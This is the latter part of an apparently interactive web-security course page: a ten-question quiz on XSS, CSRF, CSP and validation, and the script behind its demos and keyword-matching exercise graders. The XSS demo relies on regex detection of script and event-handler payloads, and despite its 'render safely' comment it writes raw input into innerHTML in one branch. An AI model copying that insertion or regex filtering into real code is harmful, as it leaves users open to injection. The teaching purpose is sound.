            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq2')">element.insertAdjacentHTML('beforeend', text)</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq2')">document.write(text)</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq2">textContent treats everything as plain text and never interprets HTML. It's the safest way to display user-generated content.</div>
        </div>

        <div class="quiz-question" data-quiz="fq3">
          <h4>‚ùì Q3: A CSRF attack works because...</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq3')">The attacker has the user's password</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq3')">The website has SQL injection vulnerabilities</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq3')">Browsers automatically include cookies with requests to any domain</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq3')">JavaScript is disabled</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq3">Browsers automatically attach cookies to requests for a domain, even if the request is initiated from a different site. This is the core mechanism CSRF exploits.</div>
        </div>

        <div class="quiz-question" data-quiz="fq4">
          <h4>‚ùì Q4: What CSP directive prevents inline scripts?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq4')">default-src 'none'</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq4')">script-src 'self' (without 'unsafe-inline')</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq4')">style-src 'self'</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq4')">img-src 'none'</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq4">When script-src doesn't include 'unsafe-inline', all inline scripts are blocked. This is the default and recommended behavior.</div>
        </div>

        <div class="quiz-question" data-quiz="fq5">
          <h4>‚ùì Q5: Which approach is better for input validation?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq5')">Blacklisting dangerous patterns</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq5')">Whitelisting allowed patterns</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq5')">Using regex to remove &lt;script&gt; tags</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq5')">Encoding all inputs to base64</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq5">Whitelisting defines exactly what IS allowed. Blacklisting tries to block known bad patterns, but attackers constantly find new bypasses.</div>
        </div>

        <div class="quiz-question" data-quiz="fq6">
          <h4>‚ùì Q6: What is a "nonce" in CSP?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq6')">A permanent secret key</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq6')">A random value generated per-request that allows specific inline scripts</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq6')">A type of CSRF token</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq6')">A password hashing algorithm</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq6">A nonce (number used once) is randomly generated per request. Only inline scripts with the matching nonce attribute execute. The attacker can't guess the nonce value.</div>
        </div>

        <div class="quiz-question" data-quiz="fq7">
          <h4>‚ùì Q7: What's wrong with this code? <code style="color:var(--accent);">setTimeout("alert('hi')", 1000)</code></h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq7')">Nothing, it's fine</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq7')">Passing a string to setTimeout uses eval() internally ‚Äî code injection risk</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq7')">setTimeout doesn't accept strings</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq7')">The delay is too short</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq7">When you pass a string to setTimeout, it's evaluated like eval(). If user input could be in that string, it's code injection. Always pass a function: setTimeout(() => alert('hi'), 1000)</div>
        </div>

        <div class="quiz-question" data-quiz="fq8">
          <h4>‚ùì Q8: Why should login error messages be generic?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq8')">To save bandwidth</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq8')">Because of GDPR regulations</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq8')">To prevent username enumeration attacks</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq8')">To confuse attackers</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq8">"Wrong password" confirms the username exists. "User not found" confirms it doesn't. "Invalid credentials" gives no information about which was wrong, preventing enumeration of valid usernames.</div>
        </div>

        <div class="quiz-question" data-quiz="fq9">
          <h4>‚ùì Q9: What type of XSS doesn't involve the server at all?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq9')">Stored XSS</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq9')">Reflected XSS</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq9')">DOM-based XSS</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq9')">All types involve the server</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq9">DOM-based XSS happens entirely in the browser. Client-side JavaScript reads tainted data (like URL hash) and writes it to the DOM unsafely, without the data ever being sent to the server.</div>
        </div>

        <div class="quiz-question" data-quiz="fq10">
          <h4>‚ùì Q10: Which SameSite cookie value provides the strongest CSRF protection?</h4>
          <div class="quiz-options">
            <div class="quiz-option" onclick="checkFinalQuiz(this, true, 'fq10')">Strict</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq10')">Lax</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq10')">None</div>
            <div class="quiz-option" onclick="checkFinalQuiz(this, false, 'fq10')">Secure</div>
          </div>
          <div class="quiz-explanation" data-quiz-exp="fq10">Strict prevents the cookie from being sent with ANY cross-site request, including top-level navigation. Lax allows cookies on top-level GET navigation. None provides no CSRF protection.</div>
        </div>
      </div>

      <!-- Completion Card -->
      <div class="completion-card" id="completionCard" style="display: none;">
        <span class="big-emoji">üèÜ</span>
        <h3>Congratulations, Security Champion!</h3>
        <p style="color: var(--text-dim); margin-bottom: 15px;">You've completed the JavaScript Security Mastery course!</p>
        <div style="font-size: 2rem; margin: 15px 0;"><span id="finalGrade"></span></div>
        <p style="margin-top: 15px;">Total XP: <strong id="finalXP" style="color: var(--accent);"></strong></p>
        <button class="demo-btn btn-primary" onclick="showSection('intro')" style="margin-top: 15px;">üìñ Review Topics</button>
      </div>

      <div class="section-nav">
        <button class="demo-btn btn-outline" onclick="showSection('auth')">‚Üê Secure Auth</button>
        <div></div>
      </div>
    </div>

  </main>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
// ===== STATE =====
const state = {
  currentSection: 'intro',
  score: 0,
  completedSections: new Set(),
  answeredQuizzes: new Set(),
  finalQuizScore: 0,
  finalQuizStreak: 0,
  totalSections: 8
};

// ===== NAVIGATION =====
function showSection(id) {
  // Hide all sections
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));

  // Show selected
  const section = document.getElementById('section-' + id);
  if (section) {
    section.classList.add('active');
    section.style.animation = 'none';
    section.offsetHeight; // force reflow
    section.style.animation = 'fadeIn 0.5s ease';
  }

  // Update nav
  const navItem = document.querySelector(`.nav-item[data-section="${id}"]`);
  if (navItem) navItem.classList.add('active');

  // Mark as visited
  if (!state.completedSections.has(id)) {
    state.completedSections.add(id);
    if (navItem) navItem.classList.add('completed');
    updateProgress();
  }

  state.currentSection = id;
  window.scrollTo(0, 0);

  // Close mobile sidebar
  document.getElementById('sidebar').classList.remove('open');
}

function toggleSidebar() {
  document.getElementById('sidebar').classList.toggle('open');
}

function updateProgress() {
  const progress = (state.completedSections.size / state.totalSections) * 100;
  const bar = document.getElementById('xpBar');
  bar.style.width = Math.min(progress, 100) + '%';
  bar.textContent = Math.round(progress) + '%';
  document.getElementById('progressText').textContent =
    `${state.completedSections.size}/${state.totalSections} modules`;
}

// ===== SCORE =====
function addScore(points) {
  state.score += points;
  const el = document.getElementById('totalScore');
  el.textContent = state.score;
  el.style.transform = 'scale(1.3)';
  setTimeout(() => el.style.transform = 'scale(1)', 300);
}

// ===== TABS =====
function switchTab(tabEl, groupName) {
  const parent = tabEl.parentElement;
  const allTabs = parent.querySelectorAll('.tab');
  const tabIndex = Array.from(allTabs).indexOf(tabEl);

  // Get all tab contents for this group
  let container = parent.parentElement;
  const contents = container.querySelectorAll(`.tab-content[data-tabgroup="${groupName}"]`);

  allTabs.forEach(t => t.classList.remove('active'));
  contents.forEach(c => c.classList.remove('active'));

  tabEl.classList.add('active');
  if (contents[tabIndex]) contents[tabIndex].classList.add('active');
}

// ===== ACCORDION =====
function toggleAccordion(header) {
  header.classList.toggle('open');
  const body = header.nextElementSibling;
  body.classList.toggle('open');
}

// ===== QUIZ =====
function checkQuiz(optionEl, isCorrect, quizId) {
  if (state.answeredQuizzes.has(quizId)) return;
  state.answeredQuizzes.add(quizId);

  const parent = optionEl.closest('.quiz-question');
  const options = parent.querySelectorAll('.quiz-option');
  const explanation = parent.querySelector('.quiz-explanation');

  options.forEach(o => {
    o.classList.add('disabled');
    if (o === optionEl) {
      o.classList.add(isCorrect ? 'correct' : 'wrong');
    }
  });

  // Highlight correct answer if wrong was selected
  if (!isCorrect) {
    options.forEach(o => {
      // We need to find the correct one by checking which was supposed to be correct
      // Since we can't easily do this retroactively, we'll highlight the selected wrong one
    });
  }

  if (explanation) {
    explanation.classList.add('show', isCorrect ? 'correct-exp' : 'wrong-exp');
  }

  if (isCorrect) {
    addScore(10);
    showToast('‚úÖ Correct! +10 XP', 'success');
  } else {
    showToast('‚ùå Not quite. Read the explanation!', 'danger');
  }
}

// ===== FINAL QUIZ =====
let finalStreak = 0;

function checkFinalQuiz(optionEl, isCorrect, quizId) {
  if (state.answeredQuizzes.has(quizId)) return;
  state.answeredQuizzes.add(quizId);

  const parent = optionEl.closest('.quiz-question');
  const options = parent.querySelectorAll('.quiz-option');
  const explanation = parent.querySelector('.quiz-explanation');

  options.forEach(o => o.classList.add('disabled'));
  optionEl.classList.add(isCorrect ? 'correct' : 'wrong');

  if (explanation) {
    explanation.classList.add('show', isCorrect ? 'correct-exp' : 'wrong-exp');
  }

  if (isCorrect) {
    state.finalQuizScore++;
    finalStreak++;
    const bonus = finalStreak >= 3 ? 5 : 0;
    addScore(15 + bonus);

    document.getElementById('fqScore').textContent = state.finalQuizScore;

    if (finalStreak >= 2) {
      const streakEl = document.getElementById('fqStreak');
      streakEl.style.display = 'inline-flex';
      streakEl.textContent = `üî• ${finalStreak} streak!`;
    }

    showToast(`‚úÖ Correct! +${15 + bonus} XP${bonus ? ' (streak bonus!)' : ''}`, 'success');
  } else {
    finalStreak = 0;
    document.getElementById('fqStreak').style.display = 'none';
    showToast('‚ùå Not quite. Study the explanation!', 'danger');
  }

  // Check if quiz is complete
  const totalAnswered = document.querySelectorAll('[data-quiz^="fq"].quiz-option.disabled').length;
  if (state.finalQuizScore + (10 - document.querySelectorAll('[data-quiz^="fq"]:not(:has(.disabled))').length) >= 0) {
    // Check if all 10 are answered
    let allAnswered = true;
    for (let i = 1; i <= 10; i++) {
      if (!state.answeredQuizzes.has('fq' + i)) {
        allAnswered = false;
        break;
      }
    }

    if (allAnswered) {
      const card = document.getElementById('completionCard');
      card.style.display = 'block';

      const grade = state.finalQuizScore >= 9 ? 'S' :
                    state.finalQuizScore >= 7 ? 'A' :
                    state.finalQuizScore >= 5 ? 'B' :
                    state.finalQuizScore >= 3 ? 'C' : 'D';

      const emoji = state.finalQuizScore >= 9 ? 'üåü' :
                    state.finalQuizScore >= 7 ? '‚≠ê' :
                    state.finalQuizScore >= 5 ? 'üëç' : 'üìö';

      document.getElementById('finalGrade').textContent = `${emoji} Grade: ${grade} (${state.finalQuizScore}/10)`;
      document.getElementById('finalXP').textContent = state.score;

      card.scrollIntoView({ behavior: 'smooth' });
    }
  }
}

// ===== TOAST =====
function showToast(message, type = 'info') {
  const toast = document.getElementById('toast');
  toast.className = `toast toast-${type}`;
  toast.textContent = message;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2500);
}

// ===== XSS DEMO =====
function setXSSInput(value) {
  document.getElementById('xssInput').value = value;
}

function renderXSSUnsafe() {
  const input = document.getElementById('xssInput').value;
  const output = document.getElementById('xssOutput');
  const explanation = document.getElementById('xssExplanation');

  // We actually render it safely but SHOW what would happen
  const hasScript = /<script/i.test(input);
  const hasEvent = /on\w+\s*=/i.test(input);
  const hasJSProtocol = /javascript:/i.test(input);
  const hasHTML = /<[a-z]/i.test(input);

  if (hasScript || hasEvent || hasJSProtocol) {
    output.innerHTML = `<div style="color: var(--danger); padding: 10px; background: rgba(255,62,108,0.1); border-radius: 8px;">
      <strong>‚ö†Ô∏è XSS DETECTED!</strong><br>
      <span style="font-size: 0.85rem;">With innerHTML, this payload would execute JavaScript!</span><br>
      <code style="font-size: 0.8rem; color: var(--text-dim);">${escapeHTML(input)}</code>
    </div>`;
    explanation.style.display = 'block';
    explanation.style.background = 'rgba(255,62,108,0.1)';
    explanation.style.border = '1px solid rgba(255,62,108,0.3)';
    explanation.style.color = 'var(--danger)';
    explanation.innerHTML = 'üíÄ <strong>VULNERABLE!</strong> innerHTML would parse and execute this payload. In a real app, the attacker\'s JavaScript would run with full access to the page, cookies, and user data.';
  } else if (hasHTML) {
    output.innerHTML = `<div style="padding: 10px; background: rgba(255,184,0,0.1); border-radius: 8px;">
      <strong>‚ö†Ô∏è HTML Injection:</strong><br>
      ${input}
      <br><span style="font-size: 0.8rem; color: var(--text-dim);">HTML is rendered ‚Äî attacker controls page appearance.</span>
    </div>`;
    explanation.style.display = 'block';
    explanation.style.background = 'rgba(255,184,0,0.1)';
    explanation.style.border = '1px solid rgba(255,184,0,0.3)';
    explanation.style.color = 'var(--warning)';
    explanation.innerHTML = '‚ö†Ô∏è <strong>HTML Injection:</strong> While this particular payload doesn\'t run JS, an attacker can modify the page content, create fake login forms, etc.';
  } else {
    output.innerHTML = `<div style="padding: 10px;">${escapeHTML(input)}</div>`;
    explanation.style.display = 'block';
    explanation.style.background = 'rgba(0,230,118,0.1)';
    explanation.style.border = '1px solid rgba(0,230,118,0.3)';
    explanation.style.color = 'var(--success)';
    explanation.innerHTML = '‚úÖ This input is safe ‚Äî no HTML or JavaScript detected.';
  }
}

function renderXSSSafe() {
  const input = document.getElementById('xssInput').value;
  const output = document.getElementById('xssOutput');
  const explanation = document.getElementById('xssExplanation');

  // Use textContent (safe)
  output.textContent = input;

  explanation.style.display = 'block';
  explanation.style.background = 'rgba(0,230,118,0.1)';
  explanation.style.border = '1px solid rgba(0,230,118,0.3)';
  explanation.style.color = 'var(--success)';
  explanation.innerHTML = '‚úÖ <strong>SAFE!</strong> textContent treats EVERYTHING as plain text. No HTML or scripts are parsed or executed. The raw text is shown exactly as typed.';
}

function escapeHTML(str) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;' };
  return str.replace(/[&<>"'\/]/g, c => map[c]);
}

// ===== SANITIZATION DEMO =====
function setSanitizeInput(value) {
  document.getElementById('sanitizeInput').value = value;
}

function runSanitization() {
  const input = document.getElementById('sanitizeInput').value;
  const output = document.getElementById('sanitizeOutput');

  const htmlEscaped = escapeHTML(input);
  const stripped = input.replace(/<[^>]*>/g, '');
  const alphaOnly = input.replace(/[^a-zA-Z0-9\s._-]/g, '');
  const urlEncoded = encodeURIComponent(input);

  output.innerHTML = `
    <div style="margin-bottom: 15px;">
      <strong style="color: var(--text-dim);">Original Input:</strong>
      <div style="background: rgba(255,62,108,0.1); padding: 8px 12px; border-radius: 6px; margin-top: 4px; font-family: var(--mono); font-size: 0.85rem; color: var(--danger); word-break: break-all;">
        ${escapeHTML(input)}
      </div>
    </div>

    <div style="margin-bottom: 12px;">
      <strong style="color: var(--success);">1. HTML Escaped:</strong>
      <div style="background: rgba(0,230,118,0.05); padding: 8px 12px; border-radius: 6px; margin-top: 4px; font-family: var(--mono); font-size: 0.85rem; word-break: break-all;">
        ${escapeHTML(htmlEscaped)}
      </div>
    </div>

    <div style="margin-bottom: 12px;">
      <strong style="color: var(--success);">2. Tags Stripped:</strong>
      <div style="background: rgba(0,230,118,0.05); padding: 8px 12px; border-radius: 6px; margin-top: 4px; font-family: var(--mono); font-size: 0.85rem; word-break: break-all;">
        ${escapeHTML(stripped)}
      </div>
    </div>

    <div style="margin-bottom: 12px;">
      <strong style="color: var(--success);">3. Alphanumeric Only:</strong>
      <div style="background: rgba(0,230,118,0.05); padding: 8px 12px; border-radius: 6px; margin-top: 4px; font-family: var(--mono); font-size: 0.85rem; word-break: break-all;">
        ${escapeHTML(alphaOnly)}
      </div>
    </div>

    <div>
      <strong style="color: var(--success);">4. URL Encoded:</strong>
      <div style="background: rgba(0,230,118,0.05); padding: 8px 12px; border-radius: 6px; margin-top: 4px; font-family: var(--mono); font-size: 0.85rem; word-break: break-all;">
        ${escapeHTML(urlEncoded)}
      </div>
    </div>
  `;
}

// ===== CSP BUILDER =====
function buildCSP() {
  const directives = [
    `default-src ${document.getElementById('csp-default').value}`,
    `script-src ${document.getElementById('csp-script').value}`,
    `style-src ${document.getElementById('csp-style').value}`,
    `img-src ${document.getElementById('csp-img').value}`,
    `object-src ${document.getElementById('csp-object').value}`,
    `frame-ancestors ${document.getElementById('csp-frame').value}`
  ];

  const policy = directives.join('; ');
  document.getElementById('cspOutput').textContent = `Content-Security-Policy: ${policy}`;

  document.getElementById('cspCode').innerHTML = `app.<span class="func">use</span>((req, res, next) => {
  res.<span class="func">setHeader</span>(<span class="string">'Content-Security-Policy'</span>,
    <span class="string">"${escapeHTML(policy)}"</span>
  );
  <span class="func">next</span>();
});`;
}

// ===== CSRF SIMULATION =====
function simulateCSRF() {
  const step1 = document.getElementById('csrfStep1');
  const step3 = document.getElementById('csrfStep3');
  const packet1 = document.getElementById('csrfPacket1');
  const packet2 = document.getElementById('csrfPacket2');
  const log = document.getElementById('csrfLog');

  // Reset
  resetCSRFSim();

  // Step 1: Victim visits evil site
  setTimeout(() => {
    step1.textContent = 'Sending malicious link...';
    step1.style.color = 'var(--danger)';
    packet1.style.opacity = '1';
    packet1.style.left = '100px';
    log.innerHTML = '<span style="color:var(--danger);">‚Üí Step 1: Victim clicks link to evil.com</span>';
  }, 500);

  // Step 2: Evil site sends hidden request
  setTimeout(() => {
    step1.textContent = 'Auto-submitting form...';
    packet1.style.opacity = '0';
    packet2.style.opacity = '1';
    packet2.style.top = '150px';
    log.innerHTML += '<br><span style="color:var(--warning);">‚Üí Step 2: evil.com auto-submits hidden form to bank.com WITH cookies üç™</span>';
  }, 2000);

  // Step 3: Bank processes request
  setTimeout(() => {
    step3.textContent = 'üíÄ Transfer processed!';
    step3.style.color = 'var(--danger)';
    packet2.style.opacity = '0';
    log.innerHTML += '<br><span style="color:var(--danger);">‚Üí Step 3: Bank sees valid session cookie ‚Üí processes transfer! $10,000 stolen üíÄ</span>';
  }, 3500);
}

function resetCSRFSim() {
  document.getElementById('csrfStep1').textContent = 'Waiting...';
  document.getElementById('csrfStep1').style.color = '';
  document.getElementById('csrfStep3').textContent = 'Server idle';
  document.getElementById('csrfStep3').style.color = '';
  document.getElementById('csrfPacket1').style.opacity = '0';
  document.getElementById('csrfPacket1').style.left = '180px';
  document.getElementById('csrfPacket2').style.opacity = '0';
  document.getElementById('csrfPacket2').style.top = '100px';
  document.getElementById('csrfLog').innerHTML = '';
}

// ===== EXERCISES =====
function checkXSSExercise1() {
  const code = document.getElementById('xssExercise1').value;
  const result = document.getElementById('xssExResult1');

  const usesTextContent = code.includes('textContent');
  const usesCreateTextNode = code.includes('createTextNode');
  const usesEscape = code.includes('escapeHTML') || code.includes('escape');
  const noInnerHTML = !code.includes('innerHTML');

  if ((usesTextContent || usesCreateTextNode || usesEscape) && noInnerHTML) {
    result.className = 'exercise-result pass';
    result.innerHTML = '‚úÖ <strong>Correct!</strong> You used a safe DOM method. textContent treats input as plain text and never executes HTML/scripts.';
    addScore(20);
    showToast('üéâ Exercise passed! +20 XP', 'success');
  } else if (usesEscape && code.includes('innerHTML')) {
    result.className = 'exercise-result pass';
    result.innerHTML = '‚úÖ <strong>Acceptable!</strong> Escaping before innerHTML works, but textContent is simpler and safer. +15 XP';
    addScore(15);
    showToast('üëç Good solution! +15 XP', 'success');
  } else {
    result.className = 'exercise-result fail';
    result.innerHTML = '‚ùå <strong>Try again.</strong> Replace innerHTML with textContent, or use document.createTextNode(). These methods treat input as plain text.';
  }
}

function checkCSRFExercise() {
  const code = document.getElementById('csrfExercise1').value;
  const result = document.getElementById('csrfExResult1');

  const checksToken = code.includes('_csrf') || code.includes('csrf-token') || code.includes('csrfToken') || code.includes('x-csrf');
  const checksSession = code.includes('session');
  const hasComparison = code.includes('===') || code.includes('!==') || code.includes('compare');
  const has403 = code.includes('403') || code.includes('Forbidden') || code.includes('reject') || code.includes('unauthorized');

  if (checksToken && (hasComparison || checksSession) && has403) {
    result.className = 'exercise-result pass';
    result.innerHTML = '‚úÖ <strong>Excellent!</strong> You check the CSRF token from the request against the session token, and reject with 403 if invalid. +20 XP';
    addScore(20);
    showToast('üéâ Exercise passed! +20 XP', 'success');
  } else if (checksToken) {
    result.className = 'exercise-result pass';
    result.innerHTML = '‚úÖ <strong>Good start!</strong> You\'re checking the token. Make sure to also compare it against the session token and return 403 on mismatch. +10 XP';
    addScore(10);
    showToast('üëç Getting there! +10 XP', 'info');
  } else {
    result.className = 'exercise-result fail';
    result.innerHTML = '‚ùå <strong>Hint:</strong> Get the token from req.body._csrf or req.headers[\'x-csrf-token\'], compare it to req.session.csrfToken, and send 403 if they don\'t match.';
  }
}

function checkSanitizeExercise() {
  const code = document.getElementById('sanitizeExercise1').value;
  const result = document.getElementById('sanitizeExResult1');

  const hasRegex = code.includes('/^[') || code.includes('/^\\w') || code.includes('a-zA-Z') || code.includes('\\w');
  const hasLength = (code.includes('.length') || code.includes('{3,20}') || code.includes('{3,'));
  const hasTest = code.includes('.test') || code.includes('.match') || code.includes('.exec');
  const returnsBoolean = code.includes('return');

  if (hasRegex && hasLength && returnsBoolean) {
    result.className = 'exercise-result pass';
    result.innerHTML = '‚úÖ <strong>Perfect!</strong> Your validation uses regex with proper character and length constraints. +20 XP';
    addScore(20);
    showToast('üéâ Exercise passed! +20 XP', 'success');
  } else if (hasRegex || hasLength) {
    result.className = 'exercise-result pass';
    result.innerHTML = '‚úÖ <strong>Partial credit!</strong> Good start. Make sure you check both character type AND length. Example: <code>/^[a-zA-Z0-9_]{3,20}$/</code> +10 XP';
    addScore(10);
    showToast('üëç Good progress! +10 XP', 'info');
  } else {
    result.className = 'exercise-result fail';
    result.innerHTML = '‚ùå <strong>Hint:</strong> Use a regex like <code>/^[a-zA-Z0-9_]{3,20}$/</code> and test it with <code>.test(username)</code>. Return the boolean result.';
  }
}

// ===== CHECKLIST =====
function toggleCheck(li) {
  li.classList.toggle('checked');
  const mark = li.querySelector('.check-mark');
  mark.textContent = li.classList.contains('checked') ? '‚úÖ' : '‚òê';

  if (li.classList.contains('checked')) {
    addScore(2);
  }
}

// ===== INIT =====
buildCSP();
updateProgress();

// Keyboard navigation
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    document.getElementById('sidebar').classList.remove('open');
  }
});

// Close sidebar when clicking outside on mobile
document.querySelector('.main').addEventListener('click', () => {
  document.getElementById('sidebar').classList.remove('open');
});
</script>

</body>
</html>